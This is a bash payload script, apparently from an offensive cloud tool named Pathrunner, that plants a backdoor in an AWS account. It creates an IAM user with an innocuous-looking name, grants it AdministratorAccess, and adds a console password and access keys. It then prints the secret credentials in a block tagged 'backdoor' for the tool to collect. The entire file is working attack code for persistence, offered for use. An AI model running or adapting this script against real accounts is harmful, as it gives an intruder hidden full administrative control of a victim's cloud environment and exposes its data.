#!/bin/bash
exec > >(tee /var/log/pathrunner-create-user.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner Create User Payload"
echo ""

sleep 10

USER_NAME="audit-recovery"

echo "Creating IAM user: $USER_NAME..."
CREATE_OUTPUT=$(aws iam create-user --user-name "$USER_NAME" 2>&1)

if [ $? -ne 0 ]; then
    echo "FAILED: Could not create user: $CREATE_OUTPUT"
    exit 1
fi

USER_ARN=$(echo "$CREATE_OUTPUT" | grep -o '"Arn": "[^"]*"' | cut -d'"' -f4)
echo "User created: $USER_ARN"

echo "Attaching AdministratorAccess policy..."
aws iam attach-user-policy \
    --user-name "$USER_NAME" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -ne 0 ]; then
    echo "FAILED: Could not attach policy"
    exit 1
fi

echo "Policy attached successfully"

# Generate random password (16 chars, mixed case + digits + symbols)
PASSWORD=$(cat /dev/urandom | tr -dc 'A-Za-z0-9!@#$%' | head -c 16)

echo "Creating console login profile..."
aws iam create-login-profile \
    --user-name "$USER_NAME" \
    --password "$PASSWORD" \
    --no-password-reset-required 2>&1

if [ $? -eq 0 ]; then
    ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
    echo "Console URL: https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
    echo "Console Username: $USER_NAME"
    echo "Console Password: $PASSWORD"
else
    echo "WARNING: Could not create login profile"
fi

echo "Creating access keys..."
KEY_OUTPUT=$(aws iam create-access-key --user-name "$USER_NAME" 2>&1)

if [ $? -eq 0 ]; then
    AK_ID=$(echo "$KEY_OUTPUT" | grep -o '"AccessKeyId": "[^"]*"' | cut -d'"' -f4)
    AK_SECRET=$(echo "$KEY_OUTPUT" | grep -o '"SecretAccessKey": "[^"]*"' | cut -d'"' -f4)

    echo "--- PATHFINDER_IDENTITY_DATA ---"
    echo "NAME=backdoor/$USER_NAME"
    echo "TYPE=keys"
    echo "ACCESS_KEY_ID=$AK_ID"
    echo "SECRET_ACCESS_KEY=$AK_SECRET"
    echo "AUTO_SWITCH=false"
    echo "--- END_PATHFINDER_IDENTITY_DATA ---"
else
    echo "WARNING: Could not create access keys"
fi

echo "SUCCESS: Backdoor user $USER_NAME created with AdministratorAccess"
echo "Create user payload complete"
